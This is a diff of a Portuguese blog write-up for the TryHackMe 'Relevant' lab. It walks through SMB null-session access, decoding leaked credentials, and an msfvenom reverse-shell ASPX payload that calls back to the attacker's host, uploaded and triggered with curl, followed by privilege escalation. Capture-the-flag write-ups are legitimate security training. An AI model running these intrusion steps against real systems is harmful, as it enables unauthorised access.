@@ -23,7 +23,7 @@ alt: "THM Relevant Writeup"
 ## RECON
 
 ### Nmap
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Relevant]
 └─$ sudo nmap -v -p- -sCV -O -Pn 10.10.226.231 --min-rate=512
 PORT      STATE SERVICE        VERSION
@@ -97,7 +97,7 @@ O nmap nos revelou que possívelmente estamos lidando com um Windows Server 2012
 
 Nos deparamos com a tela padrão do IIS, vamos fazer uma varredura com `gobuster` para tentar enumerar alguns diretórios.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Relevant]
 └─$ gobuster dir -e -u 'http://10.10.226.231:49663/' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -r
 ===============================================================
@@ -129,7 +129,7 @@ Fomos levados para uma página em branco, aparentemente até o momento a porta 4
 
 Vamos tentar null session no SMB.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Relevant]
 └─$ smbclient -L \\10.10.226.231
 Enter WORKGROUP\hastur's password: 
@@ -146,7 +146,7 @@ Temos acesso com null session!!!
 
 E um dos diretórios tem exatamente o mesmo nome do diretório encontrado na porta 49663, vamos acessá-lo.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Relevant]
 └─$ smbclient \\\\10.10.226.231\\nt4wrksv        
 Enter WORKGROUP\hastur's password: 
@@ -163,7 +163,7 @@ smb: \>
 ```
 Dentro do diretório existe o arquivo `passwords.txt`, vamos baixá-lo para enumerar seu conteúdo.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Relevant]
 └─$ cat passwords.txt 
 [User Passwords - Encoded]
@@ -172,7 +172,7 @@ QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
 ```
 Aparentemente temos duas hashes em `base64`, vamos tentar decriptá-las.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Relevant]
 └─$ echo 'Qm9iIC0gIVBAJCRXMHJEITEyMw' | base64 -d
 Bob - !P@$$W0rD!123base64: invalid input
@@ -190,7 +190,7 @@ Temos duas credenciais, mas ainda não sabemos para qual serviço em questão, v
 
 Vamos utilizar o `msfvenom` para criar nosso exploit.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Relevant]
 └─$ msfvenom -p windows/x64/shell_reverse_tcp lhost=10.9.0.16 lport=8443 -f aspx -o hastur.aspx
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -202,7 +202,7 @@ Saved as: hastur.aspx
 ```
 Vamos subir nosso exploit através do SMB.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Relevant]
 └─$ smbclient \\\\10.10.226.231\\nt4wrksv                                         
 Enter WORKGROUP\hastur's password: 
@@ -221,7 +221,7 @@ smb: \>
 
 Agora podemos setar nosso `netcat` na porta 8443 do nosso exploit e enviar um `curl` para o endereço.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Relevant]
 └─$ curl 'http://10.10.226.231:49663/nt4wrksv/hastur.aspx' 
 ```
@@ -232,7 +232,7 @@ E conseguimos nosso shell.
 
 A flag `user.txt` se encontra no Desktop do usuário `Bob`.
 
-```
+```bash
 c:\Users\Bob\Desktop>dir
 dir
  Volume in drive C has no label.
@@ -251,7 +251,7 @@ dir
 
 Ao enumerar os privilégios do usuário, encontramos algo interessante.
 
-```
+```bash
 c:\windows\system32\inetsrv>whoami /priv
 whoami /priv
 
@@ -276,7 +276,7 @@ Esta vulnerabilidade já possui um exploit público que pode ser encontrado [aqu
 
 Após fazer o download do executável, podemos subir para a máquina alvo através do SMB.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Relevant]
 └─$ smbclient \\\\10.10.226.231\\nt4wrksv                 
 Enter WORKGROUP\hastur's password: 
